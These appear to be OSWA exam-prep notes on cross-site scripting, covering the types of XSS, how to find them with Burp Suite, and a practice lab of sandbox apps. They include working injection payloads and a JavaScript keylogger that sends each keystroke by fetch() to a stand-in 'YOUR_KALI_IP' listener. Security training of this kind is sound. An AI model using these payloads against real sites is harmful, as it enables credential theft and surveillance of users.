# OSWA — Cross-Site Scripting (XSS): Introduction & Discovery

> XSS exploits the trust a user has in a site they visit. An attacker injects code that executes in the victim's browser — not on the server. A better name: **JavaScript injection** (or HTML injection when no JS is used).

---

## Why XSS Matters

```
XSS gives you access to everything the victim's browser can see, do, and access:
- Session cookies → account takeover
- Passwords (even obscured ones) → credential theft
- Keystrokes → real-time surveillance
- Local storage → sensitive data exfiltration
- DOM manipulation → phishing within a trusted domain
```

> [!tip] **XSS ≠ Server RCE** — XSS targets users, not the server. The victim must have different/greater access than the attacker for the exploit to be useful.

---

## The Core Concept

```
Normal flow:    Browser  ──►  Server  ──►  Response (HTML)  ──►  Browser renders it

XSS flow:       Attacker injects payload
                      ↓
                Server/Client appends it to the page
                      ↓
                Victim's browser executes it
```

The vulnerability is not that the app **accepts** untrusted input — it's that the app **outputs** untrusted input without encoding.

---

## XSS Classification

XSS has two axes — persistence and location:

| | Server XSS | Client XSS |
|---|---|---|
| **Where payload is appended** | Server adds it to HTML response | Client-side JS adds it to the DOM |
| **How to discover** | Check HTTP response in Burp | Must render in browser or audit JS |
| **Reflected** | Reflected Server XSS | Reflected Client XSS |
| **Stored** | Stored Server XSS | Stored Client XSS |

> [!tip] **"DOM-based XSS"** is the old term for Client XSS. The 3-category model (stored/reflected/DOM) is inaccurate — every XSS is either stored or reflected, AND either server or client. Four types total.

### Reflected vs Stored

| | Reflected | Stored |
|---|---|---|
| Persistence | Not persistent — one-time via crafted link | Persistent — saved in DB |
| Delivery | Victim must click a malicious link | Any user visiting the page is exploited |
| Danger level | Lower | Higher |

---

## JavaScript Basics for XSS

### Key APIs

| API | Access Via | What It Gives You |
|---|---|---|
| **Window** | `window.` or global | URL, localStorage, alert() |
| **Document** | `document.` | Full DOM — inputs, cookies, event listeners |
| **Fetch** | `fetch()` | Make HTTP requests from victim's browser |
| **Console** | `console.log()` | Debug only — not visible to you remotely |

### Extracting Input Values

```javascript
// Get all input elements on the page
let inputs = document.getElementsByTagName("input");

// Loop and log each value
for (let input of inputs) {
    console.log(input.value);
}
// Works on password fields too — JS sees the plaintext value
```

### Keylogger Payload

```javascript
// Log keystrokes to console (local only — not useful for exfil)
function logKey(event) {
    console.log(event.key);
}
document.addEventListener('keydown', logKey);
```

### Keylogger + Exfiltration (Fetch)

```javascript
// Send each keystroke to your listener
function logKey(event) {
    fetch("http://YOUR_KALI_IP/k?key=" + event.key);
}
document.addEventListener('keydown', logKey);
```

```bash
# Start listener on Kali to catch incoming keystrokes
python3 -m http.server 80

# You'll see requests like:
# GET /k?key=p HTTP/1.1
# GET /k?key=a HTTP/1.1
# GET /k?key=s HTTP/1.1
```

> [!tip] **Fetch errors don't matter** — "Same Origin Policy disallows reading" is a response error, but the request was still sent. Check your Python server — the data arrived.

---

## XSS Discovery Methodology

```
Step 1 — HTML injection test first
         Inject: <h1>test</h1>
         If rendered → likely injectable
         If escaped (&lt;h1&gt;) → likely sanitized

Step 2 — JavaScript injection
         Inject: <script>alert(0)</script>
         Alert box appears → XSS confirmed

Step 3 — Check server vs client
         Review HTTP response in Burp:
         - Payload in response body → Server XSS
         - Payload NOT in response → Client XSS (JS is adding it)

Step 4 — Render in victim browser
         Use sandbox Render button / send link to victim
```

---

## XSS Entry Point Escaping

### Standard Payload (div / free HTML context)
```html
<script>alert(0)</script>
```

### innerHTML Context — script tags don't execute
HTML5 blocks `<script>` injected via innerHTML. Use event handler instead:
```html
<img src='x' onerror='alert(1)'>
```

Other event handlers that work:
| Handler | Trigger |
|---|---|
| `onerror` | Failed resource load |
| `onload` | Resource loads successfully |
| `onfocus` | Element receives focus |
| `onclick` | User clicks element |

### Prepend a name to avoid empty fields
```html
John<script>alert(0)</script>
```

---

## The 4 XSS Types in Practice

### 1. Reflected Server XSS

```
Trigger:   GET parameter reflected in HTML response
Delivery:  Crafted link sent to victim
Discovery: Submit payload → check Burp response body for payload
```

```
URL: search.php?s=<script>alert(0)</script>
Encoded: search.php?s=%3Cscript%3Ealert(0)%3C%2Fscript%3E
```

Confirm in Burp:
- Proxy → HTTP History → find request → Response tab
- If payload appears in raw HTML → Server XSS confirmed ✅

---

### 2. Stored Server XSS

```
Trigger:   Input stored in DB, rendered for all visitors
Delivery:  No crafted link needed — any page visit triggers it
Discovery: Submit payload → revisit page → check if alert fires
           Test ALL input fields — some may be sanitized, others not
```

- If comment field is sanitized → try username field
- Reset DB between tests (`/reset` endpoint) for clean surface
- Any visitor = victim, not just someone who clicks a link

---

### 3. Reflected Client XSS

```
Trigger:   Client-side JS reads URL parameter and writes to DOM
Delivery:  Crafted link (like reflected server XSS)
Discovery: Submit payload → check HTTP response → payload NOT there
           → JS is injecting it client-side
           → Review page JS source (Network Tools → .js files)
```

Key difference from server XSS:
```
Server XSS: payload in HTTP response → browser renders it
Client XSS: HTTP response is clean → JS reads URL param → writes to DOM
```

Look for patterns like this in .js files:
```javascript
// Vulnerable pattern
document.getElementById("welcome").innerHTML = urlParams.get("name");
```

---

### 4. Stored Client XSS

```
Trigger:   Stored data is read by client-side JS and written to DOM
Delivery:  No crafted link — any page visit triggers it
Discovery: Submit payload → revisit results page → alert fires
           Check .js source → look for append() / innerHTML with stored data
```

- Unlike stored server XSS: response HTML is clean, JS does the injection
- `append()` method (unlike `innerHTML`) DOES execute `<script>` tags

---

## Burp Suite in XSS Discovery

```bash
# Workflow for confirming Server vs Client XSS:
1. Open Burp → disable intercept → open built-in browser
2. Navigate to target, submit XSS payload
3. Proxy → HTTP History → find the request
4. Click Response tab
5. Ctrl+F for your payload string

Found in response → Server XSS
Not found in response → Client XSS
```

---

## XSS Sandbox Reference

| App | Vulnerability | Type |
|---|---|---|
| Eval | Auto-executes JS | Practice exfil |
| Search | s= parameter | Reflected Server XSS |
| Blog | Username field | Stored Server XSS |
| Survey | name= / result fields | Reflected + Stored Client XSS |
| Donate | GET parameter | Reflected Server XSS |
| RSVP | Input field | Stored Server XSS |
| List | GET parameter | Reflected Client XSS |
| ToDo | Input field | Stored Client XSS |

---

## Key Takeaways

```
1.  XSS = code execution in victim's browser — not the server
2.  The bug is in OUTPUT not input — encoding on output prevents XSS
3.  Stored XSS > Reflected XSS — no link needed, every visitor is a victim
4.  Client XSS can't be found in HTTP responses — use the browser or read JS
5.  Test HTML injection first — it's a reliable indicator before trying JS
6.  <script> in innerHTML won't execute — use <img onerror=...> instead
7.  console.log doesn't exfiltrate — use fetch() to send data to your server
8.  Fetch "errors" don't mean failure — check your Python listener
9.  Reset the DB between tests (/reset) — old payloads pollute results
10. Every input field is a test surface — sanitized in one ≠ sanitized in all
```
